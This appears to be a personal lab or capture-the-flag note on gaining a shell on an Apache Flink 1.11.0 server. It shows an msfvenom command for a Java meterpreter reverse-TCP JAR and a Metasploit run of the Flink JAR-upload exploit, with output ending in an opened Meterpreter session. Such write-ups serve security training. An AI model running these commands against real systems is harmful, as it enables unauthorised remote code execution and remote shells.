
# potential reverse shell
- this wasn't the path.
```bash
msfvenom --platform java -f jar -p java/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=1337 -o payload.jar
```

![[Pasted image 20240330022156.png]]

# msfconsole `exploit/multi/http/apache_flink_jar_upload_exec`

```bash
msf6 exploit(multi/handler) > search flink                                                                                                                                                                  
                                                                                                                                                                                                            
Matching Modules                                                                                                                                                                                            
================                                                                                                                                                                                            
                                                                                                                                                                                                            
   #  Name                                                      Disclosure Date  Rank       Check  Description                                                                                              
   -  ----                                                      ---------------  ----       -----  -----------                                                                                              
   0  exploit/multi/http/apache_flink_jar_upload_exec           2019-11-13       excellent  Yes    Apache Flink JAR Upload Java Code Execution                                                              
   1  auxiliary/scanner/http/apache_flink_jobmanager_traversal  2021-01-05       normal     Yes    Apache Flink JobManager Traversal                                                                        
   2  auxiliary/admin/networking/cisco_secure_acs_bypass                         normal     No     Cisco Secure ACS Unauthorized Password Change                                                           
```
info
- clean the artifacts.
```bash
msf6 exploit(multi/handler) > info 0                                                                                                                                                                        
                                                                                                                                                                                                            
       Name: Apache Flink JAR Upload Java Code Execution                                                                                                                                                    
     Module: exploit/multi/http/apache_flink_jar_upload_exec                                                                                                                                                
   Platform: Java                                                                                                                                                                                           
       Arch: java
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2019-11-13

Provided by:
  Henry Chen
  bigger.wing
  bcoles <bcoles@gmail.com>

Module side effects:
 artifacts-on-disk
 ioc-in-logs

Module stability:
 crash-safe

Module reliability:
 repeatable-session
```
setup
```bash
msf6 exploit(multi/handler) > use 0                                                                                                                                                                         
[*] No payload configured, defaulting to java/meterpreter/reverse_tcp                                                                                                                                       
msf6 exploit(multi/http/apache_flink_jar_upload_exec) > show options                                                                                                                                        
                                                                                                                                                                                                            
Module options (exploit/multi/http/apache_flink_jar_upload_exec):                                                                                                                                           
                                                                                                                                                                                                            
   Name     Current Setting  Required  Description                                                                                                                                                          
   ----     ---------------  --------  -----------                                                                                                                                                          
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]                                                                                                         
   RHOSTS   10.10.110.78     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html                                                               
   RPORT    8081             yes       The target port (TCP)                                                                                                                                                
   SSL      false            no        Negotiate SSL/TLS for outgoing connections                                                                                                                           
   VHOST                     no        HTTP server virtual host                                                                                                                                             


Payload options (java/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.14.39       yes       The listen address (an interface may be specified)
   LPORT  1337              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
```
exploit -j
```bash
msf6 exploit(multi/http/apache_flink_jar_upload_exec) > exploit -j                                                                                                                                          
[*] Exploit running as background job 2.                                                                                                                                                                    
[*] Exploit completed, but no session was created.                                                                                                                                                          
msf6 exploit(multi/http/apache_flink_jar_upload_exec) >                                                                                                                                                     
[*] Started reverse TCP handler on 10.10.14.39:1337                                                                                                                                                         
[*] Running automatic check ("set AutoCheck false" to disable)                                                                                                                                              
[+] The target appears to be vulnerable. Apache Flink version 1.11.0.                                                                                                                                       
[*] Uploading JAR payload 'JrWuVQsdJym.jar' (5259 bytes) ...                                                                                                                                                
[*] Retrieving list of avialable JAR files ...                                                                                                                                                              
[+] Found uploaded JAR file '7e8e92d3-fba6-4905-8e49-5da8e47a80e9_JrWuVQsdJym.jar'                                                                                                                          
[*] Executing JAR payload '7e8e92d3-fba6-4905-8e49-5da8e47a80e9_JrWuVQsdJym.jar' entry class 'metasploit.Payload' ...                                                                                       
[*] Sending stage (57971 bytes) to 10.10.110.78                                                                                                                                                             
[*] Meterpreter session 4 opened (10.10.14.39:1337 -> 10.10.110.78:53432) at 2024-04-01 16:09:43 +0000                                                                                                      
[*] Removing JAR file '7e8e92d3-fba6-4905-8e49-5da8e47a80e9_JrWuVQsdJym.jar' ...    
```
![[Pasted image 20240401122850.png]]
# Multiple Sessions>?
![[Pasted image 20240401125023.png]]
they were all dead sessions
![[Pasted image 20240401125119.png]]
